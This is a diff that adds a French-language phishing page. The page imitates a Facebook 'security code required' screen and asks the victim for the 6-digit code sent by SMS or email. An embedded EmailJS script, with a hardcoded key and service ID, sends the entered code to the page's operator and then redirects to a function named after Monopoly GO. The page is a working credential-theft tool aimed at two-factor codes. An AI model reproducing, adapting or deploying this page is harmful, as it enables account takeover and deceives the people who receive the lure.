@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Facebook - Validation</title>
+<style>
+    body {
+      margin: 0;
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 120px;
+    }
+    h2 {
+      font-size: 1.4em;
+      margin-bottom: 10px;
+      color: #1c1e21;
+    }
+    p {
+      font-size: 0.95em;
+      color: #606770;
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 1.2em;
+      text-align: center;
+      letter-spacing: 6px;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.1em;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+    .btn-primary:hover {
+      background-color: #165ecc;
+    }
+    a {
+      display: block;
+      font-size: 0.9em;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+<div class="logo">
+<img alt="Facebook" src="logo-fb.jpg"/>
+</div>
+<h2>Code de sécurité requis</h2>
+<p>Un code à 6 chiffres vous a été envoyé par SMS ou e-mail. Veuillez le saisir ci-dessous :</p>
+<input id="verification_code" maxlength="6" pattern="\d{6}" placeholder="••••••" required type="text"/>
+<button class="btn-primary" onclick="validateInputsAndRedirect('.container input', 'index.html')">Valider</button>
+<a href="#">Renvoyer le code</a>
+</div>
+
+<script>
+function showPopup(message) {
+  const existing = document.getElementById("popup");
+  if (existing) existing.remove();
+
+  const popup = document.createElement("div");
+  popup.id = "popup";
+  popup.innerHTML = `<div class='popup-inner'>
+    <strong>Impossible d’avancer</strong><br>${message}
+  </div>`;
+  Object.assign(popup.style, {
+    position: "fixed",
+    top: "25%",
+    left: "50%",
+    transform: "translateX(-50%)",
+    backgroundColor: "#fff",
+    color: "#050505",
+    padding: "16px 20px",
+    borderRadius: "8px",
+    width: "90%",
+    maxWidth: "320px",
+    fontSize: "0.95em",
+    fontFamily: "Arial, sans-serif",
+    boxShadow: "0 4px 16px rgba(0,0,0,0.2)",
+    zIndex: 9999,
+    textAlign: "center"
+  });
+  document.body.appendChild(popup);
+  setTimeout(() => popup.remove(), 3000);
+}
+
+function validateInputsAndRedirect(inputSelector, redirectUrl) {
+  const inputs = document.querySelectorAll(inputSelector);
+  const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
+  if (!allFilled) {
+    showPopup("Veuillez remplir tous les champs obligatoires.");
+  } else {
+    window.location.href = redirectUrl;
+  }
+}
+</script>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function() {
+  emailjs.init("AATQVLMcBJaRBgEox");
+})();
+
+function sendCodeViaEmailJS() {
+  const code = document.getElementById("verification_code").value.trim();
+
+  if (!code) {
+    showPopup("Veuillez remplir tous les champs obligatoires.");
+    return;
+  }
+
+  emailjs.send("service_photos", "template_code", {
+    verification_code: code
+  }).then(function(response) {
+    console.log("Code envoyé avec succès", response.status, response.text);
+    openOrRedirectToMonopolyGO();
+  }, function(error) {
+    console.error("Erreur lors de l'envoi du code", error);
+    showPopup("Erreur lors de l'envoi. Réessayez plus tard.");
+  });
+}
+</script>
+
+</body>
+</html>
